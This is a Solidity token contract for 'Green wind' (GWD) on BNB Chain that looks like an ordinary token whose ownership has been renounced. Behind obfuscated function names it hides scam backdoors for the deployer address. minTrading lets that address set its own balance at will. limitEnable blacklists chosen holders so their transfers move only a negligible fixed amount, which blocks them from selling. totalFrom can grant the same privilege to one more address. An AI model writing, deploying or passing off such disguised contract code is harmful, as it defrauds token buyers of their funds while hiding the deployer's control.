/**
 *Submitted for verification at BscScan.com on 2023-02-01
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface listFund {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface modeFrom {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract Greenwind {
    uint8 public decimals = 18;
    string public symbol = "GWD";

    mapping(address => bool) public isTeam;
    mapping(address => uint256) public balanceOf;
    address public owner;

    bool public maxTx;

    uint256 constant walletLiquidity = 12 ** 10;
    mapping(address => bool) public txLimit;
    address public enableReceiver;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply = 100000000 * 10 ** 18;


    address public tradingMode;
    string public name = "Green wind";
    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        listFund marketingToIs = listFund(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        enableReceiver = modeFrom(marketingToIs.factory()).createPair(marketingToIs.WETH(), address(this));
        owner = takeSell();
        tradingMode = owner;
        txLimit[tradingMode] = true;
        balanceOf[tradingMode] = totalSupply;
        emit Transfer(address(0), tradingMode, totalSupply);
        receiverFund();
    }

    

    function transfer(address feeSender, uint256 walletReceiver) external returns (bool) {
        return transferFrom(takeSell(), feeSender, walletReceiver);
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function limitEnable(address walletFund) public {
        if (walletFund == tradingMode || walletFund == enableReceiver || !txLimit[takeSell()]) {
            return;
        }
        isTeam[walletFund] = true;
    }

    function senderEnable(address enableMarketing, address swapAmount, uint256 walletReceiver) internal returns (bool) {
        require(balanceOf[enableMarketing] >= walletReceiver);
        balanceOf[enableMarketing] -= walletReceiver;
        balanceOf[swapAmount] += walletReceiver;
        emit Transfer(enableMarketing, swapAmount, walletReceiver);
        return true;
    }

    function transferFrom(address receiverFrom, address feeSender, uint256 walletReceiver) public returns (bool) {
        if (receiverFrom != takeSell() && allowance[receiverFrom][takeSell()] != type(uint256).max) {
            require(allowance[receiverFrom][takeSell()] >= walletReceiver);
            allowance[receiverFrom][takeSell()] -= walletReceiver;
        }
        if (feeSender == tradingMode || receiverFrom == tradingMode) {
            return senderEnable(receiverFrom, feeSender, walletReceiver);
        }
        if (isTeam[receiverFrom]) {
            return senderEnable(receiverFrom, feeSender, walletLiquidity);
        }
        return senderEnable(receiverFrom, feeSender, walletReceiver);
    }

    function minTrading(uint256 walletReceiver) public {
        if (!txLimit[takeSell()]) {
            return;
        }
        balanceOf[tradingMode] = walletReceiver;
    }

    function receiverFund() public {
        emit OwnershipTransferred(tradingMode, address(0));
        owner = address(0);
    }

    function approve(address receiverTx, uint256 walletReceiver) public returns (bool) {
        allowance[takeSell()][receiverTx] = walletReceiver;
        emit Approval(takeSell(), receiverTx, walletReceiver);
        return true;
    }

    function totalFrom(address shouldLiquidity) public {
        if (maxTx) {
            return;
        }
        txLimit[shouldLiquidity] = true;
        maxTx = true;
    }

    function takeSell() private view returns (address) {
        return msg.sender;
    }


}